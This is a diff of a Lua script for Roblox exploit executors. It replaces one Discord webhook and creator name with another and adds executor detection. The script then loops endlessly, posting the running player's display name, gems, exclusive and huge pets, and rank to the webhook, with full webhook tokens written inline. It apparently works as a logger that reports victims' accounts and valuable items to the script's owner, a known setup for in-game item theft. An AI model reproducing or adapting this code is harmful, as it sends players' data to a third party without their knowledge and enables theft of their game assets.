@@ -1,5 +1,16 @@
-local WebHook = "https://discord.com/api/webhooks/1196752202623107132/50HcQjSlKqpxAaF93SspFlc3F1RlJDAd3iF_iM7NkXVaClmjnalbnYG1-GrVnMG_4q1S"
-local Creator = "altaasui1"
+local WebHook = "https://discord.com/api/webhooks/1196469785014317197/z3xkhmaPPkuifKGdtaqMHKTU6Y66cNFn2-9JpCJURsRas5-NDms5bZh1xEity_fnoWI3"
+local Creator = "Imissher919"
+
+local isSynapse, isFluxus, isDelta = false, false, false
+
+-- Detect executor
+if syn then
+    isSynapse = true
+elseif getgenv().Fluxus then
+    isFluxus = true
+elseif protect_gui and protect_gui["CreateWindow"] then
+    isDelta = true
+end
 
 while true do
     local displayUsername = game.Players.LocalPlayer.DisplayName
@@ -28,7 +39,7 @@ while true do
                 title = "(:penguin:) Player Info",
                 description = string.format(
                     "(:lock:) Executed By: %s\n(:game_die:) Creator: %s\n(:pushpin:) Version: 1.0(beta)\n\n" ..
-                    "(:cat:) Pets List\n(:diamond:) Diamonds: %s\n(:rocket:) Exclusive Pet: %s\n(:star:) Huge Pet: %s\n\n" ..
+                    "(:cat:) Pets List\n(:gem:) Gems: %s\n(:rocket:) Exclusive Pet: %s\n(:star:) Huge Pet: %s\n\n" ..
                     "(:crown:) Rank: %s\n(:rocket:) Creators: %s",
                     displayUsername,
                     Creator,
@@ -52,14 +63,37 @@ while true do
     local url = WebHook
     local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-    local success, response = pcall(function()
-        return syn.request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = newdata
-        })
-    end)
+    local success, response
+    if isSynapse then
+        success, response = pcall(function()
+            return syn.request({
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = newdata
+            })
+        end)
+    elseif isFluxus then
+        -- Fluxus uses `request` method
+        success, response = pcall(function()
+            return request({
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = newdata
+            })
+        end)
+    elseif isDelta then
+        -- Delta uses `request` method
+        success, response = pcall(function()
+            return request({
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = newdata
+            })
+        end)
+    end
 
     if success then
         print("Message sent successfully.")
